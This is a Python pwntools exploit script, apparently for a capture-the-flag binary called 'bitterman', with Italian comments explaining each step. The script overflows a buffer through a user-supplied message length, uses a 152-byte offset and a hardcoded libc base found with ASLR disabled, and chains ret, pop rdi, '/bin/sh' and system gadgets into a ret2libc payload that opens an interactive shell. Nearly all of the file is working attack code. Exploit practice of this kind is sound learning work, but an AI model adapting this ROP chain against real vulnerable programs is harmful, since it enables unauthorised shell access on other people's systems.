
"""
Il codice e' quasi memory safe perche' usa una funzione chiamata read_nbytes
1) la prima cosa che chiede e' il nome e qui il numero di byte massimo e' gestito dal codice
2) chiede la lunghezza del messaggio all'utente (importante)
3) chiede all'utente di inserire il messaggio   (usando come numero di byte da leggere quello inserito dall'utente)
    se uso 500 e muso pattern create e pattern search vedo che l'offset per raggiungere rsp è 152

    

abbiamo nel codice printf e puts (guarda gdb disass main)

posso usarli per leakare la libc
o posso direttamente usare gdb per trovare la libc di base (NO ASRL)
"""

from pwn import *


buf = b'\x55'*152

context(arch='amd64', os='linux')
#p = gdb.debug('./bitterman', 'b main')
p = process('./bitterman')




#flow to reach buffer overflow
p.recvuntil(b"> What\'s your name? \n")
p.sendline(b'hello')
p.recvuntil(b'> Please input the length of your message: \n')
p.sendline(b'10000')
p.recvuntil(b'> Please enter your text: \n')


#trovato con vmmap
libc_base_address = 0x00007ffff7dc4000
"""un altro modo per trovarlo è  ldd vuln2 e vedo l'indirizzo in cui viene caricata ma se ho le variabili di ambiente non funziona perchè mi sfasa gli indirizzi"""

#ldd vuln2 e vedo il path di libc   - > /lib/x86_64-linux-gnu/libc.so.6

#ropper --file  path_del_file_lib_c --search "pop rdi; ret;"
pop_rdi = p64(libc_base_address + 0x23b6a)


#vedo dove si strova la chiamata alla funzione system nel sistema
#per farlo uso readelf
#readelf -s path_lib_c | grep "system"  e prendo l'offset che mi ritorna
system = p64(libc_base_address + 0x52290)


#per prendere dove si trova bin sh faccio
#strings -a -t x path_libc | grep  "/bin/sh"
bin_sh = p64(libc_base_address + 0x1b45bd)


#ropper --file path_libc  --search "ret;"
ret = p64(libc_base_address + 0x22679)

payload = buf + ret + pop_rdi + bin_sh + system

p.sendline(payload)

#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()


